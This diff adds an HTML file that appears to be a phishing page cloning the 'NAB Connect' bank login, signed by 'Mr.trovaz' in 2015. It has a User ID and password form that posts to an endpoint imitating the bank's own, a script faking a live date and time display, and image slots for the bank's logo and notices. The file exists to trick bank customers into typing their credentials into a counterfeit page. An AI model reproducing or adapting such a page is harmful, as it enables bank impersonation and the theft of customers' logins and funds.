@@ -1,0 +1,251 @@
+<!--
+
+		#####################################################
+		#													#
+		#													#
+		#					Made	 In 	2015  			#
+		#													#			
+		#							By						#
+		#													#
+		#					  	Mr.trovaz					#
+		#													#
+		#####################################################
+-->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <link href="img/favicon.ico" rel="icon" />
+  <title>
+   Login - NAB Connect
+  </title>
+  <script language="javascript">
+   function afficherDate(idZoneAffichage) {
+
+var d= new Date();
+var mois= new Array("Jan", "Feb", "Mar","Apr", "May","Jun", "Jul", "Aug","Sep", "Oct", "Nov", "Dec");
+
+
+var LaDate = d.getDate() + " " + mois[d.getMonth()] + " " + d.getFullYear();
+
+document.getElementById(idZoneAffichage).innerHTML = LaDate;
+//zoneDate.innerHTML = LaDate;
+
+}
+
+function afficherHeure(idZoneAffichage) {
+var date= new Date();
+var hours = date.getHours() &lt; 10 ? "0" + date.getHours() : date.getHours();
+var minutes = date.getMinutes() &lt; 10 ? "0" + date.getMinutes() : date.getMinutes();
+var LHeure =hours+":"+minutes+" AM "+" AEDT ";
+
+document.getElementById(idZoneAffichage).innerHTML = LHeure;
+//zoneMontre.innerHTML = LHeure;
+}
+  </script>
+  <style>
+   input:focus, textarea:focus, .labelFocus {
+    outline: 2px solid #5897FB;
+    outline-offset: 0px;
+	}
+	input.inputLarge[type="text"],textarea.inputLarge,input.inputLarge[type="password"]{
+		width: 278px;
+	}
+	input[type="text"], input[type="password"]{
+		padding: 5px 10px;
+		margin: 0px 0px 2px;
+		border: 2px solid #B4B4B4;
+		font-size: 13px;
+		color: #333;
+		}
+	input[type="button"], input[type="text"] {
+    	border-radius: 0px;
+		}
+	body {
+    font-size: 84%;
+    font-family: Arial,Helvetica,sans-serif;
+    color: #333;
+    line-height: 1.5em;
+}
+	
+	.button {
+		width: auto;
+		height: 35px;
+		display: inline-block;
+		padding: 4px 12px;
+		text-align: center;
+		vertical-align: middle;
+		cursor: pointer;
+		border: 1px solid #454545;
+		overflow: visible;
+		background: #454545 url(img/submit_back.png) repeat scroll 0% 0%;
+		color: #FFF;
+		font: bold 12px/1em Helvetica;
+		min-width: 106px;
+	}
+	.button:hover {
+		background:#666;
+		}
+	#submit{
+		margin-left:255px;
+		margin-top:-16px;
+	}
+	#header{
+		
+		
+		}
+	#connect{
+		    margin: 0px 10px;
+			font-weight: bold;
+			color: #FFF;
+			text-decoration: none;
+			float:right;
+			margin-top:10px;
+			margin-left:10px;
+			margin-right:200px;
+		}
+		#blank{
+			background:#c20000 repeat-x ;
+			height:134px;
+			}
+		#empt{
+			height:45px;
+			}
+		#logo{
+			height:179px;
+			float:left;
+			margin-left:200px;
+			}
+		#time{
+			font: inherit;
+			font-weight: bold;
+			color: #FFF;
+			text-decoration:none;
+			float:right;
+			margin-top:66px;
+			font-size: 12px;
+			margin-right:-105px;	
+			}
+		h1 {
+			padding-bottom: 10px;
+			margin-bottom: 30px;
+			font-size : 34px;
+			letter-spacing: -2px;
+			border-bottom: 1px solid #808080;
+			color: #454545;
+			margin-left:250px;
+		}
+		#error{
+			
+			}
+		#help{
+			margin-left:370px;
+			margin-top:35px;
+			}
+		#bod{
+			margin-left:250px;
+			}
+			#for{
+				margin-left:90px;
+				}
+		#input{
+				padding-top:16px;
+				border: 2px solid #B4B4B4;
+				width:499px;
+				height:151px;
+				}
+		#pass{
+					margin-bottom:16px;
+					}
+		#user{
+					margin-bottom:16px;
+					}
+		b{
+			padding-right:5px;
+			}
+		#lab{
+			margin-left:11px;
+			width:50px;
+			}
+		#important{
+			margin-left:250px;
+			margin-top:40px;
+			}
+  </style>
+ </head>
+ <body>
+  <div id="contener">
+   <!--header-->
+   <div id="header">
+    <div id="logo">
+     <img width="231" height="179" src="img/logo.png" />
+    </div>
+    <div id="empt">
+    </div>
+    <div id="blank">
+     <div id="connect">
+      <img src="img/connect.png" />
+     </div>
+     <div id="time">
+      <div id="zoneDate">
+       29 Dec 2015
+      </div>
+      <div id="zoneMontre">
+       15:58 AM  AEDT
+      </div>
+     </div>
+    </div>
+   </div>
+   <!--body-->
+   <div id="contenent">
+    <div style="width:750px">
+     <h1>
+      Login
+     </h1>
+    </div>
+    <div id="bod">
+     <div id="help">
+      <img src="img/help.png" />
+     </div>
+     <div id="input">
+      <div id="for">
+       <form action="?TAM_OP=13698" method="post">
+        <div id="user">
+         <span id="lab">
+          <label for="usedid">
+           <b>
+            User ID
+           </b>
+          </label>
+         </span>
+         <input type="text" autocomplete="off" maxlength="10" size="15" autofocus="autofocus" id="userid" class="inputLarge" name="userid" />
+        </div>
+        <div id="pass">
+         <label for="password">
+          <b>
+           Password
+          </b>
+         </label>
+         <input type="password" autocomplete="off" maxlength="15" size="15" id="password" class="inputLarge" name="password" />
+        </div>
+        <br />
+        <div id="submit">
+         <input type="submit" class="button" value="Login" />
+        </div>
+       </form>
+      </div>
+     </div>
+    </div>
+    <div id="important">
+     <img src="img/important.png" />
+    </div>
+   </div>
+   <div style="height:200px;">
+   </div>
+  </div>
+  <script language="javascript">
+   afficherDate("zoneDate");
+afficherHeure('zoneMontre');
+  </script>
+ </body>
+</html>
